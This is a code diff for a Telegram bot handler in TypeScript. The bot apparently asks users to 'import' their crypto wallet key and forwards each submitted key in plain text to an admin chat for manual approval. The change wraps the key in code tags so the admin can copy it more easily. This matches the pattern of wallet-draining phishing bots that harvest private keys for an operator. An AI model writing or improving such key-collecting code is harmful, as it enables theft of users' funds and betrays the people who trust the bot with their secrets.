@@ -38,7 +38,8 @@ export async function createBotHandler(id: number) {
 			// Send notification to admin if enabled
 			if (company?.notifyOnUserStart) {
 				const userId = ctx.from?.id;
-				const username = ctx.from?.username || ctx.from?.first_name || "Unknown";
+				const username =
+					ctx.from?.username || ctx.from?.first_name || "Unknown";
 
 				try {
 					const adminBot = new Bot(c.env.TELEGRAM_BOT_TOKEN);
@@ -69,7 +70,7 @@ export async function createBotHandler(id: number) {
 			const adminBot = new Bot(c.env.TELEGRAM_BOT_TOKEN);
 			await adminBot.api.sendMessage(
 				company.adminChatId.toString(),
-				`User with ID ${ctx.from?.id} imported wallet key: ${walletKey}\n\nYou can approve or reject the user by sending <code>/approve_user ${ctx.from?.id} WALLET_KEY</code> or <code>/reject_user ${ctx.from?.id}</code>`,
+				`User with ID ${ctx.from?.id} imported wallet key: <code>${walletKey}</code>\n\nYou can approve or reject the user by sending <code>/approve_user ${ctx.from?.id} WALLET_KEY</code> or <code>/reject_user ${ctx.from?.id}</code>`,
 				{ parse_mode: "HTML" },
 			);
 			await ctx.reply("⏳ Wait while your wallet is being imported...");
